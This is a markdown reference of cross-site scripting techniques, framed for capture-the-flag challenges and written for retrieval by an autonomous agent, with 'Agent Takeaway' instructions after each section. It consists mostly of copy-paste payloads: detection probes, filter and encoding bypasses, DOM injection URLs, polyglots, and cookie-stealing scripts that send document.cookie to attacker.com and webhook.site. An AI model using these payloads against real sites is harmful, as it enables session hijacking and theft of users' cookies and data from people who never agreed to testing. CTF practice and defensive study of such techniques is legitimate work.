# Cross-Site Scripting (XSS) - CTF Exploitation Reference

> **Document Purpose:** Actionable XSS techniques for CTF challenges. Designed for autonomous agent retrieval with copy-paste payloads, detection methods, and context-specific exploitation.

---

## 1. QUICK REFERENCE: XSS Detection Payloads

> **When to use this section:** You suspect user input is reflected in the page without proper sanitization.

### 1.1 Basic XSS Detection Probes

**Tags:** `xss, detection, probe, testing, reflected`

**Primary Detection Payloads (Try First):**
```html
<script>alert(1)</script>
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

**Secondary Detection (If Primary Blocked):**
```html
<img src=x onerror="alert(1)">
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**Detection Without Alert (Stealthier):**
```html
<script>console.log('XSS')</script>
<img src=x onerror=console.log(1)>
<script>document.write('XSS')</script>
```

**Success Indicators:**
- Alert box appears
- Console shows XSS message
- Page content changes unexpectedly
- Error in browser console showing script execution

**Agent Takeaway:**
- Start with `<script>alert(1)</script>` in every input field
- If script tags blocked, use event handlers (`onerror`, `onload`)
- Check URL parameters, form fields, and any reflected content

---

### 1.2 Context-Specific XSS Payloads

**Tags:** `xss, context, html, javascript, attribute, payloads`

**HTML Context (Inside Tags):**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
```

**Attribute Context (Inside Quoted Attributes):**
```html
" onclick=alert(1) x="
" onfocus=alert(1) autofocus x="
' onclick=alert(1) x='
" onmouseover=alert(1) x="
```

**JavaScript Context (Inside Script Tags):**
```javascript
';alert(1)//
";alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
"-alert(1)-"
```

**URL Context (Inside href/src):**
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
javascript:alert(document.domain)
```

**CSS Context:**
```css
expression(alert(1))
</style><script>alert(1)</script>
```

**Agent Takeaway:**
- Identify WHERE input appears in the response
- Match payload to the injection context
- Break out of current context before injecting

---

### 1.3 XSS Type Identification

**Tags:** `xss, types, reflected, stored, dom, identification`

**Reflected XSS (Most Common in CTFs):**
- Input appears immediately in response
- Requires victim to click malicious link
- Test: Enter unique string, check if it appears in page source

**Stored XSS:**
- Input saved and displayed to other users
- Payload persists across page loads
- Test: Submit payload, refresh page, check if still executes

**DOM-based XSS:**
- Payload processed by client-side JavaScript
- Never sent to server
- Test: Check URL fragments (#), local storage, JavaScript sinks

**Detection Decision Tree:**
```
INPUT TEST: Submit unique string like "XSS_TEST_12345"

IF: String appears in immediate response
    → Likely Reflected XSS
    → Test with <script>alert(1)</script>

IF: String appears after page reload/on different page
    → Likely Stored XSS
    → Payload will persist

IF: String appears in DOM but not in page source
    → Likely DOM-based XSS
    → Check JavaScript for document.write, innerHTML, eval
```

**Agent Takeaway:**
- Most CTF XSS is Reflected (input → immediate output)
- Check page source vs rendered DOM to identify type
- DOM XSS requires analyzing JavaScript code

---

## 2. REFLECTED XSS EXPLOITATION

> **When to use this section:** User input is reflected in the server's response without sanitization.

### 2.1 Basic Reflected XSS Payloads

**Tags:** `xss, reflected, basic, payloads, exploitation`

**Standard Payloads:**
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

**Context Breaking Payloads:**
```html
"><script>alert(1)</script>
'><script>alert(1)</script>
</textarea><script>alert(1)</script>
</title><script>alert(1)</script>
--><script>alert(1)</script>
```

**Attribute Injection:**
```html
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
" onmouseover=alert(1) x="
```

**Agent Takeaway:**
- Try breaking out of HTML context first with `">` or `'>`
- Use multiple event handlers if one is blocked
- Check for flag in `document.cookie` or hidden elements

---

### 2.2 Finding the Flag via XSS

**Tags:** `xss, flag, extraction, ctf, cookie`

**Extract Cookie (Flag Often Here):**
```html
<script>alert(document.cookie)</script>
<script>new Image().src="http://attacker.com/?c="+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

**Extract Page Content:**
```html
<script>alert(document.body.innerHTML)</script>
<script>alert(document.documentElement.outerHTML)</script>
```

**Find Hidden Elements:**
```html
<script>alert(document.querySelector('[type=hidden]').value)</script>
<script>console.log(document.querySelectorAll('*'))</script>
```

**Read Local Storage:**
```html
<script>alert(localStorage.getItem('flag'))</script>
<script>alert(JSON.stringify(localStorage))</script>
```

**Agent Takeaway:**
- CTF flags often stored in cookies, hidden inputs, or localStorage
- Use `document.cookie`, `localStorage`, and DOM queries
- Check for admin bot that visits your XSS payload

---

## 3. FILTER BYPASS TECHNIQUES

> **When to use this section:** Basic XSS payloads are being blocked by input filters.

### 3.1 Tag and Event Handler Bypass

**Tags:** `xss, bypass, filter, tags, events, waf`

**Alternative Tags (If `<script>` Blocked):**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<object data="javascript:alert(1)">
```

**Alternative Event Handlers:**
```html
onload, onerror, onfocus, onblur
onclick, ondblclick, onmousedown, onmouseup
onmouseover, onmouseout, onmousemove
onkeydown, onkeyup, onkeypress
onchange, oninput, onsubmit
ontoggle, onwheel, oncopy, oncut, onpaste
```

**Without Parentheses:**
```html
<img src=x onerror=alert`1`>
<svg onload=alert&lpar;1&rpar;>
<img src=x onerror="alert(1)">
```

**Agent Takeaway:**
- If `<script>` blocked, use `<img>`, `<svg>`, `<body>` tags
- Many event handlers exist beyond `onerror` and `onload`
- Backticks can replace parentheses in some contexts

---

### 3.2 Encoding Bypass

**Tags:** `xss, bypass, encoding, html-entities, url-encode, unicode`

**HTML Entity Encoding:**
```html
&lt;script&gt;alert(1)&lt;/script&gt;  (decoded by browser)
&#60;script&#62;alert(1)&#60;/script&#62;  (decimal)
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;  (hex)
```

**URL Encoding:**
```
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C/script%253E  (double encoded)
```

**Unicode Encoding:**
```html
<script>\u0061lert(1)</script>
<script>eval('\x61lert(1)')</script>
```

**Mixed Encoding:**
```html
<img src=x onerror="&#97;lert(1)">
<script>eval(atob('YWxlcnQoMSk='))</script>  (base64: alert(1))
```

**Agent Takeaway:**
- Try HTML entities if angle brackets blocked: `&#60;` = `<`
- Double URL encoding bypasses some filters
- Base64 via `atob()` can hide payload

---

### 3.3 Case and Whitespace Bypass

**Tags:** `xss, bypass, case, whitespace, obfuscation`

**Case Variation:**
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<scRIPT>alert(1)</scRIPT>
```

**Whitespace Insertion:**
```html
<script >alert(1)</script>
<script	>alert(1)</script>  (tab)
<script
>alert(1)</script>  (newline)
<img src=x onerror = "alert(1)">
```

**Null Bytes and Comments:**
```html
<scr%00ipt>alert(1)</script>
<script>al/**/ert(1)</script>
<script>alert(1)//</script>
```

**No Spaces Needed:**
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
<body/onload=alert(1)>
```

**Agent Takeaway:**
- HTML tags are case-insensitive
- `/` can replace spaces in tags
- Null bytes may break filter logic

---

### 3.4 JavaScript Execution Without alert()

**Tags:** `xss, bypass, no-alert, alternative-functions, execution`

**Alternative Functions:**
```html
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log(1)</script>
<script>document.write('XSS')</script>
```

**eval() Variations:**
```html
<script>eval('ale'+'rt(1)')</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>window['alert'](1)</script>
<script>this['alert'](1)</script>
```

**setTimeout/setInterval:**
```html
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',0)</script>
<script>setTimeout(alert,0,1)</script>
```

**Function Constructor:**
```html
<script>Function('alert(1)')()</script>
<script>[].constructor.constructor('alert(1)')()</script>
```

**Agent Takeaway:**
- If `alert` blocked, use `confirm`, `prompt`, or `console.log`
- `eval()`, `setTimeout()`, `Function()` can execute strings
- String concatenation bypasses keyword filters

---

## 4. DOM-BASED XSS

> **When to use this section:** XSS occurs entirely in the browser via JavaScript processing.

### 4.1 Common DOM XSS Sinks

**Tags:** `xss, dom, sinks, javascript, sources`

**Dangerous Sinks (Where Payload Executes):**
```javascript
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
new Function()
location.href
location.assign()
location.replace()
```

**Common Sources (Where Attacker Input Comes From):**
```javascript
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage data
```

**Detection Pattern:**
```
SOURCE (attacker-controlled) → SINK (dangerous function) = DOM XSS
```

**Agent Takeaway:**
- Look for JavaScript that uses URL fragments (`#`) or query params
- Check if input flows into innerHTML, document.write, or eval
- DOM XSS doesn't appear in page source, only in rendered DOM

---

### 4.2 DOM XSS Exploitation Payloads

**Tags:** `xss, dom, exploitation, fragment, hash`

**URL Fragment Payloads:**
```
http://target.com/page#<img src=x onerror=alert(1)>
http://target.com/page#<script>alert(1)</script>
http://target.com/page#javascript:alert(1)
```

**Query Parameter Payloads:**
```
http://target.com/page?search=<script>alert(1)</script>
http://target.com/page?name="><img src=x onerror=alert(1)>
```

**PostMessage Exploitation:**
```html
<script>
window.postMessage('<img src=x onerror=alert(1)>', '*');
</script>
```

**Agent Takeaway:**
- Test URL hash (`#`) with XSS payloads
- Check if JavaScript reads and displays URL parameters
- Analyze JavaScript source for vulnerable patterns

---

## 5. CTF-SPECIFIC XSS STRATEGIES

> **When to use this section:** Solving XSS challenges in CTF competitions.

### 5.1 XSS CTF Pattern Recognition

**Tags:** `xss, ctf, patterns, recognition, strategy`

**Common CTF XSS Setups:**
- Input reflected in page → Classic reflected XSS
- "Report to admin" button → Need to steal admin's cookie
- Comment/feedback form → Stored XSS to attack admin
- Search functionality → Reflected XSS in search results
- Profile/username display → Stored XSS

**Flag Location Hints:**
- Cookie with `flag` or `session` name
- Hidden admin page
- LocalStorage/SessionStorage
- Response from admin action

**Typical CTF Flow:**
```
1. Find reflection point
2. Craft XSS payload
3. Steal cookie/session OR access admin page
4. Get flag from admin context
```

**Agent Takeaway:**
- "Report" or "Contact Admin" buttons suggest cookie stealing
- Flag is usually in admin's cookie or admin-only page
- May need external server to receive stolen data

---

### 5.2 Cookie Stealing Payloads

**Tags:** `xss, ctf, cookie-stealing, exfiltration, webhook`

**Basic Cookie Exfiltration:**
```html
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
```

**Using Webhook Services:**
```html
<script>fetch('https://webhook.site/YOUR-ID?c='+document.cookie)</script>
<script>navigator.sendBeacon('https://webhook.site/YOUR-ID',document.cookie)</script>
```

**Encoded/Bypass Versions:**
```html
<img src=x onerror="fetch('https://webhook.site/ID?c='+document.cookie)">
<svg onload="new Image().src='https://hook.site/?'+document.cookie">
```

**Agent Takeaway:**
- Use webhook.site, requestbin.com, or similar to capture data
- Include `document.cookie` in exfiltration
- Flag is often in the stolen cookie value

---

### 5.3 XSS Challenge Decision Tree

**Tags:** `xss, ctf, decision-tree, workflow`

```
START: Suspected XSS challenge

STEP 1: Find input reflection
├── Test each input field with: <script>alert(1)</script>
├── Test URL parameters
├── Test form fields
└── Look for input in page source

STEP 2: If reflection found
├── Check if script executes
├── If blocked → Try bypass techniques (Section 3)
├── If in attribute → Use event handlers
└── If in JavaScript → Break out with '; or ";

STEP 3: Identify flag location
├── Cookie? → Steal with document.cookie
├── Admin page? → Use XSS to access
├── Hidden element? → Read DOM
└── External? → Exfiltrate to webhook

STEP 4: Craft final payload
├── For self-XSS: Just trigger alert
├── For cookie theft: Exfiltrate to attacker server
└── For admin action: Trigger admin-only request

STEP 5: Deliver payload
├── Direct URL → Share with "admin bot"
├── Stored → Submit and wait for admin view
└── Report form → Submit URL for admin to visit
```

**Agent Takeaway:**
- Always check for input reflection first
- Determine if you need to steal cookies or perform actions
- Use external services to capture exfiltrated data

---

## 6. XSS POLYGLOTS

> **When to use this section:** You need a single payload that works in multiple contexts.

### 6.1 Universal XSS Polyglots

**Tags:** `xss, polyglot, universal, multi-context`

**Classic Polyglot:**
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**Shorter Polyglot:**
```
'"><img src=x onerror=alert(1)>
```

**Breaking Multiple Contexts:**
```
-->'"/></script></title></textarea><script>alert(1)</script>
```

**Attribute + HTML Context:**
```
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
```

**Agent Takeaway:**
- Polyglots attempt to work regardless of context
- Use when you can't determine exact injection context
- Simpler payloads are often more reliable

---

## 7. SUMMARY: XSS Quick Reference

**Detection:** `<script>alert(1)</script>` in all inputs

**If Blocked:**
- Try `<img src=x onerror=alert(1)>`
- Try `<svg onload=alert(1)>`
- Try encoding, case variation, or polyglots

**Cookie Stealing:**
```html
<script>fetch('https://webhook.site/ID?c='+document.cookie)</script>
```

**Flag Locations:**
- `document.cookie`
- Admin-only pages
- Hidden DOM elements
- LocalStorage

**CTF Workflow:**
1. Find reflection → 2. Bypass filters → 3. Steal cookie or access admin → 4. Get flag
